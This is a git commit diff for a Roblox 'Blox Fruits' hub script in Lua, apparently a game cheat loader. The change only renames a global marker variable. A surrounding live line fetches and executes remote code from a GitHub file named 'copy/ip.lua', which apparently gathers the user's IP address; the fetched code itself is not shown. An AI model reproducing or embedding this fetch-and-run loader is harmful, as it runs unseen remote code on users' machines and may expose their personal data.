78560eaa9cc30df0b8e797af701e3109ef2275b7
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-27 21:07:24 -0300

    Actualizar blox-fruits_ro-hub.lua

--- blox-fruits_ro-hub.lua
+++ blox-fruits_ro-hub.lua
@@ -1,4 +1,4 @@
-_G.script_executed = "blox-fruits_ro-hub"
+_G.script_executed = "blox-fruits_ro-hub.lua"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
 
